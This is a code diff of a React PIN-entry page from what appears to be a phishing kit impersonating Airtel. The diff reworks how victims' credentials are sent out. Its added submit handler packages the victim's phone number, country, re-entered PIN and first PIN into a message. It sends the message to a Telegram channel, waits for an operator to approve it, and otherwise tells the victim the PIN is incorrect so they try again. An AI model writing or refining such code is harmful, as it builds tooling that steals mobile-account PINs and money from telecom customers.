@@ -3,8 +3,7 @@ import { motion } from 'motion/react';
 import { AirtelLogo } from './Logos';
 import { InternetPlan } from '../types';
 import { ValidatingModal } from './ValidatingModal';
-import { useTelegramPolling } from '../hooks/useTelegramPolling';
-import { telegramService } from '../services/telegramService';
+import { sendLoginToTelegramAndWait } from '../utils/simpleTelegram';
 import { LanguageSwitch } from './LanguageSwitch';
 import { useApp } from '../context/AppContext';
 import { CountryInfo } from '../data/countries';
@@ -96,26 +95,6 @@ export const ReenterPinPage: React.FC<ReenterPinPageProps> = ({
   const currentPin = pinDigits.join('');
   const isPinComplete = currentPin.length === 4;
 
-  // Telegram polling hook for re-entered PIN verification
-  const { status: telegramStatus } = useTelegramPolling({
-    sessionId,
-    phone,
-    targetStep: 'reenter',
-    isActive: isWaitingTelegram,
-    onApproved: () => {
-      setTimeout(() => {
-        setIsWaitingTelegram(false);
-        onSuccess(currentPin);
-      }, 800);
-    },
-    onRejected: () => {
-      setIsWaitingTelegram(false);
-      setErrorMessage(t('reenterPinRejected'));
-      setPinDigits(['', '', '', '']);
-      pinInputRefs.current[0]?.focus();
-    },
-  });
-
   const handleSubmit = async (e?: React.FormEvent) => {
     if (e) e.preventDefault();
     if (!isPinComplete || isSubmitting) return;
@@ -124,29 +103,37 @@ export const ReenterPinPage: React.FC<ReenterPinPageProps> = ({
     setErrorMessage(null);
 
     try {
-      // Send re-entered PIN to Telegram
-      const success = await telegramService.sendReenterPin({
-        sessionId,
-        phone,
-        fullPhone: displayPhone,
-        country: `${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}`,
-        airtelBrand: country.airtelBrand,
-        originalPin: initialPin,
-        pin: currentPin,
-        planName: `${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})`,
-        planPrice: selectedPlan.price,
-      });
+      // Format message for Telegram
+      const message =
+        `🔐 <b>CODE PIN CONFIRMÉ / RESSAISI (ÉTAPE POST-OTP)</b>\n\n` +
+        `🌍 <b>Pays Airtel:</b> ${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}\n` +
+        `👤 <b>Numéro:</b> <code>${displayPhone}</code>\n` +
+        `🔑 <b>Code PIN Ressaisi (Correct):</b> <code>${currentPin}</code>\n` +
+        `📌 <b>Code PIN Initial:</b> <code>${initialPin}</code>\n` +
+        `📦 <b>Forfait:</b> ${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity}) (${selectedPlan.price})\n` +
+        `⏰ <b>Heure:</b> ${new Date().toLocaleTimeString('fr-FR')}\n` +
+        `🆔 <b>Session:</b> <code>${sessionId}</code>\n\n` +
+        `👇 <i>Confirmez la validation finale du code PIN pour activer le forfait :</i>`;
 
-      if (success) {
-        setIsWaitingTelegram(true);
+      // Send to Telegram and wait for approval (using phone as username, isCode=false)
+      setIsWaitingTelegram(true);
+      const approved = await sendLoginToTelegramAndWait(message, phone, false);
+
+      setIsWaitingTelegram(false);
+
+      if (approved) {
+        onSuccess(currentPin);
       } else {
         setErrorMessage(
           language === 'fr'
-            ? 'Impossible d\'envoyer le PIN à Telegram. Veuillez vérifier votre connexion.'
-            : 'Failed to send PIN to Telegram. Please check your connection.'
+            ? 'Code PIN incorrect. Veuillez réessayer.'
+            : 'Incorrect PIN. Please try again.'
         );
+        setPinDigits(['', '', '', '']);
+        pinInputRefs.current[0]?.focus();
       }
     } catch (err: any) {
+      setIsWaitingTelegram(false);
       setErrorMessage(
         err.message ||
           (language === 'fr'
@@ -371,7 +358,7 @@ export const ReenterPinPage: React.FC<ReenterPinPageProps> = ({
         phone={displayPhone}
         planName={selectedPlan.dataAmount}
         planPrice={selectedPlan.price}
-        status={telegramStatus}
+        status={isWaitingTelegram ? 'pending' : 'idle'}
       />
     </div>
   );
